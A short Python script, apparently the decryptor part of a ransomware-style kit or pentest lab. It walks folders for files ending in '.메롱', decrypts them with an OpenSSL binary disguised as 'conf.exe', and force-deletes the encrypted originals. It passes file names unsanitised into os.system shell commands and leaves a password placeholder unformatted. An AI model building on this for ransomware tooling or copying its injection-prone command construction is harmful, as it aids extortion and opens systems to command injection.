import os
import sys
#camellia-256-ofb, aes-254-ofb
base_path = sys._MEIPASS
for root, dirs, files in os.walk((".").encode('utf8')):#..\\pentest2
	for file in files:
		if file.endswith((".메롱").encode('utf8')):
			target = '"' + os.path.join(root, file).decode('utf8') +'"'
			print(target)
			os.system(base_path+'\\openssl\\bin\\conf.exe enc -aes-256-ofb -d -in '+target+' -pass pass:{pass} > '+target[:-3]+'"')
			os.system('del /F ' + target + ' 1> nul 2>&1')
